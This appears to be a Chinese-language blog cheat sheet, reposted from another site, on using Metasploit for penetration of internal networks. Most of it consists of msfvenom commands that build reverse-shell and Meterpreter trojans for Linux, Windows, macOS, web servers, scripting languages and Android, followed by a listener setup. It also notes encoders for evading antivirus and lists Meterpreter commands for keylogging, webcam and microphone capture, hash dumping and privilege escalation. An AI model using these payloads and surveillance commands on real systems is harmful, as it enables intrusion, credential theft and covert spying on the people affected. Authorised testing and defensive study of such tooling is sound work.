> > metasploit-framework
神器的一些常用命令，以及内网渗透中如何使用它。'
## Mac下安装metasploit

mac下安装metasploit比较简单，官网下载pkg安装包，直接安装即可；需要注意的是安装完成后的路径。
msfconsole路径：
<pre><code>/opt/metasploit-framework/bin
</code></pre>
## msf的插件路径：
<pre><code>/opt/metasploit-framework/embedded/framework/modules/exploits</code></pre>
### msfvenom
作用：生成木马文件，替代早期版本的msfpayload和msfencoder。
### Options

msfvenom命令行选项如下：
<pre><code>-p, --payload    <payload>       指定需要使用的payload(攻击荷载)
-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all
-n, --nopsled    <length>        为payload预先指定一个NOP滑动长度
-f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
-a, --arch       <architecture>  指定payload的目标架构
    --platform   <platform>      指定payload的目标平台
-s, --space      <length>        设定有效攻击荷载的最大长度
-b, --bad-chars  <list>          设定规避字符集，比如: &#039;\x00\xff&#039;
-i, --iterations <count>         指定payload的编码次数
-c, --add-code   <path>          指定一个附加的win32 shellcode文件
-x, --template   <path>          指定一个自定义的可执行文件作为模板
-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
    --payload-options            列举payload的标准选项
-o, --out   <path>               保存payload
-v, --var-name <name>            指定一个自定义的变量，以确定输出格式
    --shellest                   最小化生成payload
-h, --help                       查看帮助选项
    --help-formats</code></pre>
### options usage

查看支持的payload列表：
<pre><code>msfvenom -l payloads
</code></pre>
查看支持的输出文件类型：
<pre><code>msfvenom --help-formats</code></pre>
查看支持的编码方式：(为了达到免杀的效果)

<pre><code>msfvenom -l encoders</code></pre>
查看支持的空字段模块：(为了达到免杀的效果)

<pre><code>msfvenom -l nops</pre></code>
#### 基础payload

命令格式

<pre><code>msfvenom -p <payload> <payload options> -f <format> -o <path></code></pre>
#### Linux

<pre><code>反向连接：
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
正向连接：
msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf</code></pre>
#### Windows

<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe</pre></code>
#### Mac

<pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
Web Payloads</code></pre>
#### PHP

<pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php</code></pre>
#### ASP

<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp</code></pre>
#### JSP

<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp</code></pre>
#### WAR

<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.wa
Scripting Payloads</code></pre>
#### Python

<pre><code>msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py</code></pre>
#### Bash

<pre><code>msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh</code></pre>
#### Perl

<pre><code>msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl</code></pre>

#### Android
<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > Desktop/123.apk</code></pre>
#### 连接木马

开启msf，启用exploit/multi/handler模块。

<pre><code>use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
show options
set RHOST 10.0.0.1
set LPORT 12345  
exploit</code></pre>
#### meterpreter shell

当我们拿到目标服务器的meterpreter_shell后，可以进行很多操作。

<pre><code>backgroud 将msf进程放到后台
session -i 1 将进程拖回前台运行
run vnc 远程桌面的开启</code></pre>
#### 文件管理功能：

<pre><code>Download     下载文件
Edit          编辑
cat           查看
mkdir         创建
mv            移动
rm            删除
upload        上传         
rmdir         删除文件夹</code></pre>
#### 网络及系统操作：

<pre><code>Arp          看ARP缓冲表
Ifconfig     IP地址网卡
Getproxy     获取代理
Netstat      查看端口链接
Kill         结束进程
Ps           查看进程
Reboot       重启电脑
Reg          修改注册表
Shell        获取shell
Shutdown     关闭电脑
sysinfo      获取电脑信息</code></pre>
用户操作和其他功能讲解:

<pre><code>enumdesktops     用户登录数
keyscan_dump　　 键盘记录－下载
keyscan_start　　键盘记录　－　开始
keyscan_stop 　　键盘记录　－　停止
Uictl　　　　　　获取键盘鼠标控制权
record_mic　　　 音频录制
webcam_chat　　　查看摄像头接口
webcam_list　　　查看摄像头列表
webcam_stream　　摄像头视频获取
Getsystem　　　　获取高权限
Hashdump　　　   下载ＨＡＳＨ</code></pre>
#### meterpreter添加路由

大多时候我们获取到的meterpreter shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。
#### 更新Meterpreter
<pre>更新命令是：msfupdate
、执行apt-get update
获取更新列表
、执行apt-get install metasploit-framework</code></pre>

> > 转载修改至
**https**://thief.one/2017/08/01/1/
